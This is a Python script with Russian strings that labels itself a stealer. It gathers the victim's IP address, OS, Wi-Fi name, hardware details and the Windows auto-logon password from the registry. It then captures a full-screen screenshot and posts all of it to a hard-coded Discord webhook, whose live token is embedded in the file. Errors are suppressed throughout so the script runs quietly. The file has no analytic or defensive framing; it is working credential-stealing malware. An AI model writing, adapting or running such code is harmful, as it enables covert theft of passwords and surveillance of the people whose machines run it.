import os
import sys
import socket
import platform
import subprocess
from datetime import datetime
import requests
import base64
import ctypes
from ctypes import wintypes
import re

# === НАСТРОЙКИ ===
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489695317858193518/PebAqOtRFWY8xngp50BgTH2INJ2gK-Zg3NwvbeURZthnep41uRs3H4k97g5aP3rMDj9N"


def get_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip.startswith("169.254"):
            return f"{ip} (APIPA — нет сети)"
        return ip
    except:
        return "Ошибка"


def get_os_info():
    try:
        return f"{platform.system()} {platform.release()}"
    except:
        return "Ошибка"


def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def get_wifi_ssid():
    try:
        system = platform.system()

        if system == "Windows":
            check = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, shell=True)

            if check.stdout is None:
                return "Нет вывода команды"

            output = check.stdout.strip()
            if not output:
                return "Пустой вывод (возможно, нет прав)"

            for line in output.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        ssid = parts[1].strip()
                        if ssid and ssid != "":
                            return ssid

            ps_script = '(Get-NetConnectionProfile | Where-Object {$_.InterfaceType -eq "WiFi"}).Name'
            ps_result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True,
                                       shell=True)
            if ps_result.stdout and ps_result.stdout.strip():
                return ps_result.stdout.strip()

            return "Не подключён к Wi-Fi"

        elif system == "Linux":
            try:
                result = subprocess.run(["iwgetid", "-r"], capture_output=True, text=True)
                if result.stdout and result.stdout.strip():
                    return result.stdout.strip()
            except:
                pass
            return "Wi-Fi не определён"

        elif system == "Darwin":
            try:
                result = subprocess.run(
                    ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"],
                    capture_output=True, text=True)
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if "SSID:" in line:
                            return line.split("SSID:")[1].strip()
            except:
                pass
            return "Wi-Fi не определён"

        else:
            return f"ОС {system} не поддерживается"

    except Exception as e:
        return f"Ошибка: {str(e)}"


def get_windows_password():
    try:
        key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        result = subprocess.run(f'reg query "{key}" /v DefaultPassword', capture_output=True, text=True, shell=True)

        if result.stdout is None:
            return "Нет вывода"

        for line in result.stdout.splitlines():
            if "DefaultPassword" in line:
                parts = line.split()
                if len(parts) >= 3:
                    password = parts[-1]
                    if password and password != "0":
                        return password
        return "Пароль не сохранён в реестре"
    except Exception as e:
        return f"Ошибка: {str(e)[:30]}"


def get_gpu_info():
    """Получает информацию о видеокарте"""
    try:
        ps_script = '''
        Get-WmiObject Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*"} | Select-Object -First 1 | ForEach-Object { $_.Name }
        '''
        result = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                                capture_output=True, text=True, timeout=10, shell=True)
        if result.stdout and result.stdout.strip():
            return result.stdout.strip()

        result2 = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], capture_output=True,
                                 text=True, shell=True)
        lines = result2.stdout.splitlines()
        for line in lines:
            line = line.strip()
            if line and line.lower() != "name" and (
                    "intel" in line.lower() or "nvidia" in line.lower() or "amd" in line.lower() or "radeon" in line.lower() or "geforce" in line.lower() or "rtx" in line.lower() or "gtx" in line.lower()):
                return line[:100]
        return "Не удалось определить"
    except:
        return "Ошибка"


def get_cpu_info():
    """Получает информацию о процессоре"""
    try:
        ps_script = '''
        Get-WmiObject Win32_Processor | Select-Object -First 1 | ForEach-Object { $_.Name }
        '''
        result = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                                capture_output=True, text=True, timeout=10, shell=True)
        if result.stdout and result.stdout.strip():
            cpu_name = result.stdout.strip()
            cpu_name = re.sub(r'\s+', ' ', cpu_name)
            return cpu_name[:80]

        result2 = subprocess.run(["wmic", "cpu", "get", "name"], capture_output=True, text=True, shell=True)
        lines = result2.stdout.splitlines()
        for line in lines:
            line = line.strip()
            if line and line.lower() != "name" and len(line) > 5:
                return line[:80]
        return "Не удалось определить"
    except:
        return "Ошибка"


def get_ram_info():
    """Получает информацию об ОЗУ (только объём)"""
    try:
        # Способ 1: через PowerShell
        ps_script = '''
        $totalMemory = 0
        Get-WmiObject Win32_PhysicalMemory | ForEach-Object { $totalMemory += $_.Capacity }
        $gb = [math]::Round($totalMemory / 1GB, 1)
        Write-Output "${gb}GB"
        '''
        result = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                                capture_output=True, text=True, timeout=10, shell=True)
        if result.stdout and result.stdout.strip():
            return result.stdout.strip()

        # Способ 2: через wmic
        result2 = subprocess.run(["wmic", "ComputerSystem", "get", "TotalPhysicalMemory"], capture_output=True,
                                 text=True, shell=True)
        lines = result2.stdout.splitlines()
        for line in lines:
            line = line.strip()
            if line and line.lower() != "totalphysicalmemory" and line.replace(".", "").isdigit():
                bytes_mem = int(line)
                gb = round(bytes_mem / (1024 ** 3), 1)
                return f"{gb}GB"

        # Способ 3: через os.sysconf (Linux)
        if platform.system() == "Linux":
            import sys
            pages = os.sysconf('SC_PHYS_PAGES')
            page_size = os.sysconf('SC_PAGE_SIZE')
            total_mem = pages * page_size
            gb = round(total_mem / (1024 ** 3), 1)
            return f"{gb}GB"

        return "Не удалось определить"
    except:
        return "Ошибка"


def get_hardware_info():
    """Собирает информацию о комплектующих (без материнской платы)"""
    try:
        gpu = get_gpu_info()
        cpu = get_cpu_info()
        ram = get_ram_info()

        hardware = f"""
[КОМПЛЕКТУЮЩИЕ ПК]
Процессор: {cpu}
Видеокарта: {gpu}
Оперативная память: {ram}
        """
        return hardware
    except Exception as e:
        return f"\n[ОШИБКА СБОРА КОМПЛЕКТУЮЩИХ]\n{str(e)[:100]}"


def take_screenshot_windows():
    """Скриншот через ctypes и user32/gdi32"""
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32

        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)

        hdc_screen = user32.GetDC(None)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbitmap)

        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)

        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ("biSize", wintypes.DWORD),
                ("biWidth", wintypes.LONG),
                ("biHeight", wintypes.LONG),
                ("biPlanes", wintypes.WORD),
                ("biBitCount", wintypes.WORD),
                ("biCompression", wintypes.DWORD),
                ("biSizeImage", wintypes.DWORD),
                ("biXPelsPerMeter", wintypes.LONG),
                ("biYPelsPerMeter", wintypes.LONG),
                ("biClrUsed", wintypes.DWORD),
                ("biClrImportant", wintypes.DWORD),
            ]

        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = screen_width
        bmi.biHeight = -screen_height
        bmi.biPlanes = 1
        bmi.biBitCount = 24
        bmi.biCompression = 0

        pixel_data = ctypes.create_string_buffer(screen_width * screen_height * 3)
        result = gdi32.GetDIBits(hdc_mem, hbitmap, 0, screen_height, pixel_data, ctypes.byref(bmi), 0)

        if result:
            file_header = bytearray([
                0x42, 0x42, 0, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0
            ])

            dib_header = bytearray()
            dib_header.extend((40).to_bytes(4, 'little'))
            dib_header.extend(screen_width.to_bytes(4, 'little', signed=True))
            dib_header.extend(screen_height.to_bytes(4, 'little', signed=True))
            dib_header.extend((1).to_bytes(2, 'little'))
            dib_header.extend((24).to_bytes(2, 'little'))
            dib_header.extend((0).to_bytes(4, 'little'))
            dib_header.extend((len(pixel_data)).to_bytes(4, 'little'))
            dib_header.extend((2835).to_bytes(4, 'little'))
            dib_header.extend((2835).to_bytes(4, 'little'))
            dib_header.extend((0).to_bytes(4, 'little'))
            dib_header.extend((0).to_bytes(4, 'little'))

            file_size = 14 + 40 + len(pixel_data)
            file_header[2:6] = file_size.to_bytes(4, 'little')

            bmp_data = bytes(file_header) + bytes(dib_header) + pixel_data.raw

            return base64.b64encode(bmp_data).decode('utf-8')

        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)

        return None

    except Exception as e:
        return None


def take_screenshot_powershell():
    """Альтернативный метод через PowerShell"""
    try:
        ps_script = '''
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
        $tempFile = [System.IO.Path]::GetTempFileName() + ".png"
        $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
        $base64 = [System.Convert]::ToBase64String($bytes)
        Remove-Item $tempFile
        Write-Output $base64
        '''
        result = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                                capture_output=True, text=True, timeout=15, shell=True)
        if result.stdout and len(result.stdout) > 100:
            return result.stdout.strip()
        return None
    except:
        return None


def take_screenshot():
    """Основная функция скриншота"""
    screenshot = take_screenshot_windows()
    if screenshot:
        return screenshot

    screenshot = take_screenshot_powershell()
    if screenshot:
        return screenshot

    return None


def send_to_discord(message):
    try:
        data = {"content": f"```\n{message}\n```"}
        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
    except:
        pass


def send_screenshot_to_discord():
    """Отправляет скриншот как файл в Discord"""
    try:
        screenshot_b64 = take_screenshot()
        if screenshot_b64:
            screenshot_bytes = base64.b64decode(screenshot_b64)

            if screenshot_bytes[:2] == b'BM':
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bmp"
                content_type = "image/bmp"
            else:
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                content_type = "image/png"

            files = {
                'file': (filename, screenshot_bytes, content_type)
            }
            requests.post(DISCORD_WEBHOOK_URL, files=files, timeout=15)
            return True
    except Exception as e:
        pass
    return False


def main():
    try:
        data = f"""
[СТИЛЕР ЗАПУЩЕН]
Время: {get_current_time()}
IP: {get_ip()}
ОС: {get_os_info()}
Wi-Fi: {get_wifi_ssid()}
Пароль ПК: {get_windows_password()}
{get_hardware_info()}
        """
        send_to_discord(data)

        send_screenshot_to_discord()

    except Exception as e:
        try:
            send_to_discord(f"[ОШИБКА]\n{str(e)[:200]}")
        except:
            pass


if __name__ == "__main__":
    main()